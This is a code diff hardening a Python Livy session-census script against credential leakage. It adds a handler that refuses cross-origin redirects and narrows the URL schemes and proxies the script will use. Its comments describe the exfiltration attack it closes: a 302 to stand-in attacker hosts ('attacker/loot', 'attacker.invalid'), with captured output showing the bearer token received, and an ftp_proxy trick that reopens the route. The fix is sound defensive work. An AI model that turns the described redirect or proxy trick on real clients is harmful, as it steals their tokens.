@@ -38,6 +38,7 @@ how the same swallow this file removed reappears one level up.
 import json
 import os
 import sys
+import urllib.error
 import urllib.parse
 import urllib.request
 from collections import Counter
@@ -49,13 +50,82 @@ MAX_PAGES = 40
 
 REAPABLE_STATES = ("error", "dead", "killed", "not_started", "shutting_down")
 
+# Default ports, so `http://h/x` and `http://h:80/x` compare as one origin.
+_DEFAULT_PORTS = {"http": 80, "https": 443}
+
+
+def _origin(url):
+    """The (scheme, host, port) triple two URLs must share to be same-origin."""
+    parts = urllib.parse.urlsplit(url)
+    scheme = (parts.scheme or "").lower()
+    return (scheme, (parts.hostname or "").lower(), parts.port or _DEFAULT_PORTS.get(scheme))
+
+
+def _origin_str(origin):
+    """Render an origin triple for an error message, omitting an unknown port."""
+    scheme, host, port = origin
+    return f"{scheme}://{host}" + (f":{port}" if port is not None else "")
+
+
+class _SameOriginRedirectHandler(urllib.request.HTTPRedirectHandler):
+    """Refuse any redirect that leaves the origin the request was aimed at.
+
+    THIS is the guard that closes the exfiltration vector; the opener's scheme
+    scoping below is defence in depth, not the fix. The distinction matters
+    because an earlier cut got it backwards: it removed the `ftp:` transport and
+    then claimed the redirect vector was closed, when the far easier `http:`
+    variant needed no proxy variable and was one character's difference.
+
+    Measured against that cut, with a local `302 -> http://<attacker>/loot`:
+
+        census _get returned: {'total': 0, 'sessions': []}
+        ATTACKER RECEIVED path : /loot
+        ATTACKER RECEIVED auth : Bearer SUPER_SECRET_TOKEN
+
+    Note the census SUCCEEDED. Nothing was raised, nothing was logged, and the
+    operator would have read a healthy-looking empty pool while the token sat in
+    someone else's access log — the exact "broken read that prints like an empty
+    pool" class this whole file exists to prevent, arriving through the network
+    instead of through a parse.
+
+    The mechanism is `HTTPRedirectHandler.redirect_request`, which rebuilds the
+    Request copying EVERY header except content-length/content-type. urllib does
+    not strip `Authorization` across a host change the way `requests` does, so
+    the bearer token travels to whatever host `Location:` names.
+
+    A Livy `/sessions` list has no legitimate cross-host redirect, so this
+    REFUSES rather than stripping the header: a request that silently loses its
+    credentials would come back 401 from an unexpected host and send the reader
+    somewhere else entirely. Refusing names the real cause. Same-origin
+    redirects (path changes, trailing-slash normalisation) still work.
+    """
+
+    def redirect_request(self, req, fp, code, msg, headers, newurl):
+        target = urllib.parse.urljoin(req.full_url, newurl)
+        if _origin(target) != _origin(req.full_url):
+            raise urllib.error.HTTPError(
+                target, code,
+                f"refusing cross-origin redirect "
+                f"{_origin_str(_origin(req.full_url))} -> "
+                f"{_origin_str(_origin(target))} — urllib copies the "
+                f"Authorization header across a host change, so following this "
+                f"would hand the bearer token to that host",
+                headers, fp)
+        return super().redirect_request(req, fp, code, msg, headers, newurl)
+
 
 def _http_only_opener():
     """An opener whose only URL schemes are http and https.
 
-    The scheme check in `_get` vets the URL WE build. It says nothing about
-    where the server then sends us, and the stdlib's default opener will follow
-    a redirect out of http entirely:
+    THIS IS DEFENCE IN DEPTH, NOT THE REDIRECT FIX. The guard that actually
+    closes the exfiltration vector is `_SameOriginRedirectHandler` above, which
+    refuses ANY redirect off the origin — including the `http:` variant that
+    needs no proxy variable and that an earlier cut of this file left wide open
+    while claiming the vector was closed. What this function does is remove the
+    non-http transports entirely, so a bug in the redirect guard cannot reach a
+    scheme this script never had any business opening.
+
+    The stdlib's default opener will follow a redirect out of http:
 
       * `HTTPRedirectHandler.http_error_302` allows a `Location:` whose scheme
         is in `('http', 'https', 'ftp', '')` — so `file:`, `data:` and `gopher:`
@@ -65,13 +135,8 @@ def _http_only_opener():
         EVERY header except content-length/content-type. Measured directly:
         the redirected Request to `ftp://…` carries `Authorization: Bearer …`.
 
-    So a hostile or compromised `DEV` endpoint answering `302 -> ftp://attacker/`
-    exfiltrates `$TOK`. With the default opener that connection is genuinely
-    attempted; with this one the redirect dies in `UnknownHandler`
-    ("unknown url type: ftp") having dialled nothing.
-
     NOTE — `urllib.request.build_opener(HTTPHandler, HTTPSHandler,
-    HTTPRedirectHandler)` does NOT do this. Its handler arguments only
+    HTTPRedirectHandler)` does NOT restrict anything. Its handler arguments only
     DE-DUPLICATE the default set; `FTPHandler`, `FileHandler` and `DataHandler`
     are still installed and the ftp route stays live (measured: routes were
     still {ftp, file, data, http, https, …}). The list has to be built
@@ -81,11 +146,10 @@ def _http_only_opener():
     `ProxyHandler.__init__` does `setattr(self, '%s_open' % type, …)` for EVERY
     key in the proxies dict, and the default `ProxyHandler()` reads
     `getproxies()` — env vars plus, on Windows, the registry. So a single
-    `ftp_proxy` (or `all_proxy`) puts the ftp route straight back:
+    `ftp_proxy` puts the ftp route straight back:
 
         routes, no proxy vars : ['http', 'https', 'unknown']
         routes, ftp_proxy set : ['ftp', 'http', 'https', 'unknown']
-        routes, all_proxy set : ['all', 'http', 'https', 'unknown']
 
     and it fails OPEN, not closed: `proxy_open` sees `orig_type='ftp'` differ
     from `proxy_type='http'` and re-dispatches through `self.parent.open()`, so
@@ -94,6 +158,12 @@ def _http_only_opener():
 
         GET ftp://attacker.invalid/loot HTTP/1.1
         Authorization: Bearer SECRET
+
+    (`all_proxy` registers an `all_open` rather than an `ftp_open`, and
+    `OpenerDirector._open` dispatches on `req.type`, so `all_open` is never
+    reached for an ftp URL — measured: "unknown url type: ftp". It is covered by
+    the same filter as defence in depth, but it is NOT a demonstrated exploit
+    and is not claimed as one.)
 
     Filtering the dict to http/https keeps proxy support for the schemes we
     actually use — a self-hosted runner behind `http_proxy` still reaches its
@@ -116,7 +186,7 @@ def _http_only_opener():
     handlers = [
         urllib.request.ProxyHandler(proxies),
         urllib.request.HTTPHandler(),
-        urllib.request.HTTPRedirectHandler(),
+        _SameOriginRedirectHandler(),
         urllib.request.HTTPErrorProcessor(),
         urllib.request.HTTPDefaultErrorHandler(),
         urllib.request.UnknownHandler(),
@@ -144,8 +214,15 @@ def _get(url: str, token: str) -> dict:
     # `DEV` is operator-supplied, so the scheme is checked STRUCTURALLY (parse,
     # not a substring test) right at the call site. Same shape as the sibling
     # loom-unity-migrate-catalog.py — it keeps the guarantee next to the open
-    # rather than making a reader trace it back to the caller. This covers the
-    # URL we build; `_OPENER` covers where the server tries to send us next.
+    # rather than making a reader trace it back to the caller.
+    #
+    # THREE separate guards, and they cover different things — the earlier cut
+    # of this file conflated them and claimed the redirect vector was closed
+    # when only its ftp branch was:
+    #   this check         — the URL WE build
+    #   _SameOriginRedirectHandler — where the server tries to send us next,
+    #                                for ANY scheme including plain http
+    #   _http_only_opener  — which transports exist at all (defence in depth)
     if urllib.parse.urlparse(url).scheme not in ("http", "https"):
         raise ValueError(f"refusing non-http(s) request URL: {url!r}")
     with _OPENER.open(req, timeout=60) as resp:
